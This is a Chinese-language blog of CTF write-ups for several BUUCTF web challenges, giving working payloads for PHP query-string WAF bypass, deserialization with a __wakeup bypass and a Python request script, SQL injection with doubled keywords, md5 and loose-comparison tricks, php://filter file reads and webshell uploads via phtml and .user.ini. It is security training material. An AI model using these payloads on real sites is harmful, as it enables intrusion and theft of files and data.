@[toc]
# [RoarCTF 2019]Easy Calc

进入页面，发现，诶还真是一个计算器
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210526215120867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
* 看看源码![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052621525832.png)是有个输入过滤,发现这个计算器在向calc.php传参，我们进去看看
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210526215421690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210526215447771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
* 这就是calc.php页面，在这里我们看到了GET传参，还有一个黑名单，这又是正则匹配绕过呀
* 后面的思路就不太清楚了，看了看前辈的博客
>https://blog.csdn.net/weixin_44077544/article/details/102630714

简要概括，PHP对字符串进行解析的时候会自动将变量关联到\$_GET和\$_POST中，比如`?flag=123就是Array([flag]=>"123")`，但是在解析过程中PHP会自动删除某些空白符并且使用下划线代替某些符号，比如`?%20flag[1=123`解析后就是`Array([flag_1]=>"123")`，利用这个特性，可以对正则过滤的检测做一些绕过。


![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527184148156.png)
给`num`赋字母的时候会出现错误，但是如果传值使用`%20num`那么waf就找不到`num`这个变量，因为现在变量已经变成`%20num`了，但是在PHP进行解析的时候会将它赋值给`num`，这样不仅绕过了waf还向页面传递了非法变量。

---
以上是PHP字符串解析漏洞，学习了这个之后我们就可以知道该怎样对waf传递参数限制进行绕过，接下来让我们在这个基础上继续进行深入。

* 知道怎样传参，就要开始寻找flag文件，这时候要借助于PHP和对文件进行操作的函数，这里查阅对相关知识进行一波补充。

>https://www.cnblogs.com/phper12580/p/10395374.html

上述文章详细地列出了PHP常用函数，收藏消化

我们用到`scandir()`这个函数对目录进行扫描，然后返回一个数组

* 但是扫描当前目录的话斜杠是被过滤掉的，这里使用chr()进行绕过
* var_dump()函数对一个变量的类型和内容进行输出

最后
`?%20num=var_dump(scandir(chr(47)))`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527185617548.png)
`?%20num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))`

交了。

**这道题考点，PHP字符串解析漏洞，PHP文件操作相关函数**

# [极客大挑战 2019]PHP

>I have a cat!

页面中的猫不知道什么原因没有加载出来，不重要

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528074757616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
重要的是这段话，提示有网站备份文件，通过目录扫描扫一下

>网站源码通常是.zip或者.tar

现在遇到的问题就是，扫目录一般扫出来的东西太多，排查需要时间，最终确定为是`www.zip`这个文件。

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052807500038.png)
www目录下的几个文件如图所示。

进行代码审计<index.php>

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528075151597.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)有这么一段，GET传参`select`然后对其进行反序列化，考点显而易见

包含的文件是<class.php>，去看一眼

```php
<?php
include 'flag.php';

error_reporting(0);

class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();

            
        }
    }
}
?>
```
有这么几个点
* 包含文件flag.php
* 有一个Name类
* 其中有两个变量`username`和`password`
* _wakeup()函数将`username`重新赋值`guest`
* 析构函数_destruct()检查密码是否为100，检查用户名是否为admin

关于`_wakeup()`函数绕过，将对象属性个数改为不符合的就可以

```powershell
<?php

class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();


        }
    }
}

$a=serialize(new Name("admin",100));
echo $a;


```

```python
import requests

url="http://4d78761f-a911-45bc-aa84-f27a7b0daa1b.node3.buuoj.cn/index.php"

html=requests.get(url+'?select=O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;}')

print(html.text)
```

flag就出了，不晓得为什么用python脚本就可以，url访问就不行...

**反序列化，多加学习**


# [极客大挑战 2019]Upload

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528090402325.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
这个上传页面长得好好看√

关于文件上传，第一步要做的就是看一下有什么过滤

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528090508794.png)
页面提交框去的是这个页面，直接访问emm没有什么内容

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528090635921.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)简单传一个图片马上去
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528090730105.png)

有过滤

图片马上传，MIME绕过改content-type，文件头绕过改文件头

phtml里面包含php代码，详情查阅phtml和php文件区别

* 上传文件成功，然后需要知道上传文件路径才能连接，但是不知道
* 觉得一般思路是在这里进行目录扫描，但是网站一直429太多请求，也不能扫，看前辈博客都是猜路径，好吧，路径是upload

* BUUCTF很奇怪，我上传之后发现了19年前辈上传的文件，人傻了，搞不清它是怎么样的存储方式...
* 找到自己的文件，蚁剑连接
* flag在根目录下的flag


**一句话木马学得还是不行，图片马练得也不行，文件上传要回顾了**


# [ACTF2020 新生赛]Upload

跟刚刚的上传题说拜拜，现在转头遇到新的upload，一睹她的芳容叭

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530200542655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
灯里面有上传点

测试发现只能上传jpg.png.gif图片

尝试上传jpg文件改后缀php也不行，绕过MIME，文件头绕过，但是提示我nonono badfile，尝试其他名称phtml才发现可行...弄不懂为什么

**算了，回头系统的复习一下吧**

# [极客大挑战 2019]BabySQL
一道SQL注入题，还是同一个系列

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530201903235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
还是尝试一下万能密码`' or 1=1 or '1'='1' #`
发现返回了这个

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530202106516.png)
* 数据库用的是MariaDB
* `or`被过滤掉了

紧接着我又尝试了大小写，或者and，都被过滤

然后尝试双写，因为可能只是把它过滤成空了，然后成了

`' oorr 1=1 oorr '1'='1'#`

然后我就想还有什么其他注入，想到堆叠注入，但是还想到管道符代替`and`和`or`

* 于是乎尝试管道符

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530202321931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
也能行

但是接下来测试联合查询发现`union,select`被过滤了，同样尝试双写

最终查出来`flag`在`b4bsql`里，查出所有的字段就可以看到了

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530205537712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
**双写绕过**


# [ACTF2020 新生赛]BackupFile

嗯看到这个题目就想备份文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530210229123.png)


于是下意识尝试了一下`index.php.bak`
没想到啊，能下载

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530210309687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
得，看一眼

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021053021032765.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
* 看到这个页面要一个`GET`传参
* 参数必须是一个`数字`
* 对数字进行`intval()`操作，该函数作用是对参数进行取整，无法对`object`进行取整，否则返回一个`false`
* 然后用加工过的`key`与`str`进行一次比较，这里用的是`==`，直接想到弱比较(松散比较)，详情查阅⬇⬇⬇
* [PHP 类型比较表](https://www.php.net/manual/zh/types.comparisons.php)


>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行
>参见[PHP 不同类型之间的松散和严格比较](https://www.cnblogs.com/weiyalin/p/10388167.html)

传参`?key=123`得到flag
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530213838291.png)
**松散比较可别忘了**


# [HCTF 2018]admin

能力有限，这个题只能向大佬取经记录

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530214649708.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530215025869.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210530215110968.png)

>瞻仰一下[HCTF2018-admin](https://blog.csdn.net/weixin_44677409/article/details/100733581)



# [极客大挑战 2019]BuyFlag
好熟悉的页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021053109252337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)看看买flag的条件
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531092938288.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
看看网页注释

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531093019934.png)用POST传参money和password
用`is_numric()`检测参数，如果正确就初始话为404

抓包分析
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021053109450467.png)

>哈哈哈这里我还试了一下添加referer头，忽略忽略

传了几次包之后发现`user=0`貌似是一个判断用的，于是乎弄成`1`看看能不能过
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531094628393.png)
能过，那下面就是熟悉的弱比较

传参`404a`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531094745426.png)
然后就得打钱了，给`money`传参
`money=100000000`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531094926468.png)
说数字太长

然后联想起最近查弱比较的时候有`1e2=100`这样比较的，就直接试了一试

`money=1e8`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531095235160.png)
GET！！

**观察细致才是王道**

# [BJDCTF2020]Easy MD5

首先来到一个很干净的页面

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531095620524.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
一看就很想命令执行怎么办233

提交了几次查询，页面没有变化
抓包分析一下

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531100929274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
响应头里面有这么一个暗示

`select * from 'admin' where password=md5($pass,true)`
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021053110121133.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)

---
是，想的是拼接SQL语句，但是最终也没有想出来到底该怎么传值才能闭合语句，查了查别人写的

说`ffifdyop`这个字符串经`md5`加密之后前几位正好是`'or'6`的16进制值，所有经mysql解析的时候就会自动解释为`'or'6`从而对SQL语句进行闭合

**但是，即使知道`'or'6`的`16进制值`，如何反推回`md5`加密后前部分含有这个值的原始字符串呢？**

这是一个大大的疑问，没有想通，但是姑且按照这个做下去，先把疑问留下。

---

传值`ffifdyop`之后网页代码出现这么一段

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531121905108.png)
访问对应页面
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531122022896.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
可以看到，页面接受`GET`传参`a`和`b`，并使用`弱比较类型`,这里有两种方法
* 传字符串`md5`加密之后前部分是`0e`开头的，这样两者值最终都为0相等
* 传数组，使得`md5()`函数最终返回`FALSE`,两个`FALSE`相等从而达成等价条件

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531124519684.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)传值成功之后又来到这个页面，这次用`强比较类型`，强比较类型下无法使用科学计数法，所以只能使用第二种方法使得`FALSE`相等，传数组上。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210531124734286.png)
终于出了。
>一篇不错的总结[ MD5绕过的技巧 ](https://www.cnblogs.com/hacker-snail/p/13955722.html)

**md5()绕过，强大**


# [ZJCTF 2019]NiZhuanSiWei

逆转思维

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021060110302936.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
首先来到我们的题目页面，是一段代码审计

包含三个参数:`text`,`file`,`password`

* 要求一:传参text的内容为`welcome to the zjctf`
* 要求二:文件包含`file`，但是file里面不能有`flag`字样
* 要求三:传参`password`，然后输出

首先看第一个，`file_get_contents()`函数是把整个文件内容读到一个字符串里，但是现在也没有提供的文件给读，想着是自己写入一个文件然后再读，但是再想可以直接用`data://`打印内容啊，于是上`data伪协议`

`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210601103926439.png)
ok条件达成，要知道必须完成上面的条件才能进一步深入

---
再看第二个，`file`参数，有提示是`useless.php`，但是只是`include`，没有源码，参考第一步用伪协议，我们直接第二部也用伪协议看一下源码

`file=php://filter/read=convert.base64/resource=useless.php`
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210601104330293.png)
解码一下

```php

<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?>  

```

发现，这个文件里面是一个类，也是输出文件内容，结合上面代码里`file`字段说`flag not now`，可以推断这里让传的参数应该是`flaag.php`了，但是要怎么传内容，回到源码

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210601104641963.png)
`password`参数的作用也该浮出水面了，这里用的反序列化，上面有一道题目就是反序列化传参，这里我们也同样思路，传参
>不过值得注意的是这里没有接收参数的函数，所以运行代码的时候手动更改一下

```php

<?php  

class Flag{  //flag.php  
    public $file="flag.php";  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  

$a=new Flag();
echo serialize($a);
?>  
```

```php
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
```

构造终极payload(记得把`file`参数改回`useless.php`啊不然没法正常包含了)

`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210601105104683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM3ODk2,size_16,color_FFFFFF,t_70)
感觉世界都平静了怎么回事，页面打出来个这个，没有东西了。

`F12`

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210601105147690.png)


**伪协议+反序列化，有意思**

# [SUCTF 2019]CheckIn

来到本次的最后一题√
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210601105603298.png)


文件上传题，考畸形后缀？前端校验？MIME校验？文件头校验？00截断？不晓得
来一个小马试试水
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210601105809174.png)
上传了`1.php`，发现不行，试试图片
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021060110585321.png)
检测文件内容

---
这道题涉及.user.ini文件知识，粗略讲不好，待以后详细学完补充

这里的思路是引用`auto_prepend_file`来自动为每个文件添加包含文件，上传含有webshell的图片马，然后访问同目录下的`index.php`，然后再蚁剑连接

>注意这里一定要到上传目录下的index.php文件中才能连接


**终了，这一篇暂时记录到这里，开下一波**
